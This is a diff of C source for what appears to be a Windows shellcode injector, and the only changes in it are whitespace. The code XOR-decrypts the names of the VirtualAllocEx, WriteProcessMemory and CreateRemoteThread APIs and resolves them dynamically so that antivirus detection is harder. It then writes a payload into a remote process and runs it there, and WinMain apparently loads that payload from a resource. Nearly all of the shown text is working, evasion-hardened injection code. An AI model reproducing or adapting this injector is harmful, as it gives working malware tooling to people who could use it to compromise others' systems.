@@ -87,27 +87,27 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
 
         LPVOID pRemoteCode = NULL;
         HANDLE hThread = NULL;
-		char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };
-		char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };
-		char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };
+	char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };
+	char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };
+	char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };
 
-		// Decrypt (DeXOR) the strings sVirtualAllocEx, sWriteProcessMemory and sCreateRemoteThread
-		XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
-		XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
-		XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
+	// Decrypt (DeXOR) the strings sVirtualAllocEx, sWriteProcessMemory and sCreateRemoteThread
+	XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
+	XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
+	XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
 		
-		//resolving function addresses dynamically using GetProcAddress and GetModuleHandle
-		pVirtualAllocEx = GetProcAddress(GetModuleHandle("Kernel32.dll"), sVirtualAllocEx);
-		pWriteProcessMemory = GetProcAddress(GetModuleHandle("Kernel32.dll"), sWriteProcessMemory);
-		pCreateRemoteThread = GetProcAddress(GetModuleHandle("Kernel32.dll"), sCreateRemoteThread);
+	//resolving function addresses dynamically using GetProcAddress and GetModuleHandle
+	pVirtualAllocEx = GetProcAddress(GetModuleHandle("Kernel32.dll"), sVirtualAllocEx);
+	pWriteProcessMemory = GetProcAddress(GetModuleHandle("Kernel32.dll"), sWriteProcessMemory);
+	pCreateRemoteThread = GetProcAddress(GetModuleHandle("Kernel32.dll"), sCreateRemoteThread);
 		
-		// Allocate memory in the remote process to store the payload
+	// Allocate memory in the remote process to store the payload
         pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
 		
-		// Write the payload to the allocated memory in the remote process
+	// Write the payload to the allocated memory in the remote process
         pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
         
-		// Create a remote thread in the remote process, starting at the address of the allocated memory
+	// Create a remote thread in the remote process, starting at the address of the allocated memory
         hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
         if (hThread != NULL) {
 		// Wait for the remote thread to finish executing (500 milliseconds timeout)
@@ -117,7 +117,7 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
 		// Return 0 to indicate success
                 return 0;
         }
-		// Return -1 to indicate failure
+	// Return -1 to indicate failure
         return -1;
 }
 
@@ -127,11 +127,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	void * exec_mem;
 	BOOL rv;
 	HANDLE th;
-    DWORD oldprotect = 0;
+    	DWORD oldprotect = 0;
 	HGLOBAL resHandle = NULL;
 	HRSRC res;
 	int pid = 0;
-    HANDLE hProc = NULL;
+    	HANDLE hProc = NULL;
 	
 	unsigned char * payload;
 	unsigned int payload_len;
